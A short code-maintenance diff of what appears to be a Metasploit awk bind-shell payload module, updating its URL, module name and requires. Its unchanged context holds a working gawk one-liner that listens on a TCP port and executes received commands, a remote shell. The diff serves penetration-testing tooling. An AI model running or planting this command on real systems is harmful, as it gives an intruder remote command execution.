@@ -1,14 +1,13 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit4
+module MetasploitModule
 
   CachedSize = 96
 
@@ -52,5 +51,4 @@ module Metasploit4
   def command_string
     "awk 'BEGIN{s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
   end
-
 end
